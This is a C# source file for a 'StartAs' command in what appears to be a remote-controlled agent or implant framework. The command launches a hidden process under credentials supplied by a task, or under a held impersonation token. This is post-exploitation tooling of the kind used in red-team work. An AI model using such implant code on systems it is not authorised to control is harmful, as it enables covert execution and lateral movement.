using Agent.Helpers;
using Agent.Models;
using System;
using System.Threading.Tasks;
using System.Threading;
using WinAPI;
using WinAPI.Wrapper;
using Shared;

namespace Agent.Commands
{
    public class StartASCommand : AgentCommand
    {
        public override CommandId Command => CommandId.StartAs;
        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            task.ThrowIfParameterMissing(ParameterId.Command);
            string cmd = task.GetParameter<string>(ParameterId.Command);

            task.ThrowIfParameterMissing(ParameterId.User);
            task.ThrowIfParameterMissing(ParameterId.Password);
            task.ThrowIfParameterMissing(ParameterId.Domain);

            var domain = task.GetParameter<string>(ParameterId.Domain);
            var password = task.GetParameter<string>(ParameterId.Password);
            var username = task.GetParameter<string>(ParameterId.User);

            ProcessCredentials creds = new ProcessCredentials()
            {
                Domain = domain,
                Username = username,
                Password = password,
            };

            var creationParms = new ProcessCreationParameters()
            {
                Command = cmd,
                RedirectOutput = false,
                CreateNoWindow = true,
                CurrentDirectory = Environment.CurrentDirectory,
                Credentials = creds,
            };

            if (context.Agent.ImpersonationToken != IntPtr.Zero)
                creationParms.Token = context.Agent.ImpersonationToken;

            var procResult = APIWrapper.CreateProcess(creationParms);

            if (procResult.ProcessId == 0)
            {
                context.Error("Process start failed!");
                return;
            }

            if (creationParms.RedirectOutput)
                APIWrapper.ReadPipeToEnd(procResult.OutPipeHandle, output => context.AppendResult(output, false));
        }
    }
}
